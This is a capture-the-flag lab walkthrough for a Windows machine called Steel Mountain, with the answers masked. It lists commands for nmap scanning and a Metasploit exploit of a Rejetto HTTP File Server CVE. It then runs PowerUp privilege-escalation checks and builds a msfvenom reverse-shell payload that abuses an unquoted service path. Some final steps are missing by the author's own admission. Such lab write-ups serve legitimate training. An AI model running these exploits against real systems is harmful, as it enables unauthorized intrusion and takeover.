# Steel Mountain

- Who is the employee of the month?

	- Save that image and perform a reverse image search.
	- `Bill ******`

- Scan the machine with nmap. What is the other port running a web server on?

	- `nmap -A -p- <TARGET_IP>`
	- `****`

- Take a look at the other web server. What file server is running?

	- `******* http file server`

- What is the CVE number to exploit this file server?

	- `searchsploit rejetto file server 2.3`
	- Search those on exploitdb.
	- `2014-****`

- Use Metasploit to get an initial shell. What is the user flag?

	- `msfconsole`
	- `search 2014-****`
	- `use 0`
	- `set RHOSTS <TARGET_IP>`
	- `SET RPORT 8080`
	- `exploit`
	- `cat user.txt`
	- `***************************`

- To execute this using Meterpreter, I will type load powershell into meterpreter.

	  no answer needed

	- `wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1`
	- `upload PowerUp.ps1`
	- `load powershell`
	- `powershell_shell`
	- `. .\PowerUp.ps1`
	- `Invoke-AllChecks`

- Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

	- `AdvancedSystemC**********9`

- Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

	  no answer needed

- What is the root flag?

	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4443 -f exe -o Advanced.exe`
	
	- `........` The only things I remember... sorry
	- `Advanced.exe`
	- `cd C:/Users/Administrator/Desktop`
	- `cat root.txt`
	- `***********************`

	- `......................`
